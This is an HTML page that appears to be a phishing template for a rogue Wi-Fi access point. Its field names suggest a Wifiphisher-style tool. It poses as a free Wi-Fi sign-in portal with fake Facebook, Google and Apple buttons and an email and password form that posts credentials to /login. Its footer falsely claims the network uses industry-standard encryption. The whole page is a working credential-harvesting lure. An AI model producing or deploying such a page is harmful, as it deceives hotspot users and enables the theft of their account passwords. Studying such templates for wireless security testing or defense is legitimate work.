<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Wi-Fi — Sign in to Connect</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
               background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { width: 380px; }
        .card { background: #fff; border-radius: 16px; padding: 36px;
                box-shadow: 0 25px 50px rgba(0,0,0,0.25); }
        .wifi-icon { text-align: center; margin-bottom: 20px; font-size: 48px; }
        h1 { text-align: center; font-size: 20px; color: #1a1a2e; margin-bottom: 4px; }
        .sub { text-align: center; color: #666; font-size: 13px; margin-bottom: 28px; }
        .social-btn { display: flex; align-items: center; width: 100%;
                      padding: 14px 18px; border: none; border-radius: 10px;
                      font-size: 15px; font-weight: 600; cursor: pointer;
                      margin-bottom: 12px; color: #fff; transition: opacity 0.2s; }
        .social-btn:hover { opacity: 0.9; }
        .social-btn svg { width: 22px; height: 22px; margin-right: 12px; flex-shrink: 0; }
        .fb { background: #1877f2; }
        .google { background: #fff; color: #333; border: 1px solid #ddd; }
        .apple { background: #000; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #aaa; font-size: 12px; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }
        .divider span { padding: 0 12px; }
        label { display: block; font-size: 12px; font-weight: 600; color: #555; margin-bottom: 4px; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 12px; border: 1px solid #e0e0e0;
            border-radius: 8px; font-size: 14px; margin-bottom: 12px; }
        .btn-email { width: 100%; padding: 14px; background: #667eea; color: #fff;
                     border: none; border-radius: 10px; font-size: 15px;
                     font-weight: 600; cursor: pointer; }
        .btn-email:hover { background: #5a6fd6; }
        .terms { text-align: center; font-size: 10px; color: #999; margin-top: 16px; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="wifi-icon">&#128246;</div>
            <h1>Free Wi-Fi Access</h1>
            <p class="sub">Sign in with your social account to get online</p>

            <form method="POST" action="/login" id="socialForm">
                <input type="hidden" name="wfphshr-provider" id="provider" value="">
                <button type="button" class="social-btn fb" onclick="submitSocial('facebook')">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                    Continue with Facebook
                </button>
                <button type="button" class="social-btn google" onclick="submitSocial('google')">
                    <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                    Continue with Google
                </button>
                <button type="button" class="social-btn apple" onclick="submitSocial('apple')">
                    <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
                    Continue with Apple
                </button>
            </form>

            <div class="divider"><span>or use email</span></div>

            <form method="POST" action="/login">
                <input type="hidden" name="wfphshr-provider" value="email">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="wfphshr-email" placeholder="your@email.com" required>
                <label for="pass">Password</label>
                <input type="password" id="pass" name="wfphshr-password" placeholder="Password" required>
                <button type="submit" class="btn-email">Sign In</button>
            </form>

            <p class="terms">By continuing, you agree to the Terms of Use and Privacy Policy.<br>This network uses industry-standard encryption.</p>
        </div>
    </div>
    <script>
        function submitSocial(provider) {
            document.getElementById('provider').value = provider;
            document.getElementById('socialForm').submit();
        }
    </script>
</body>
</html>
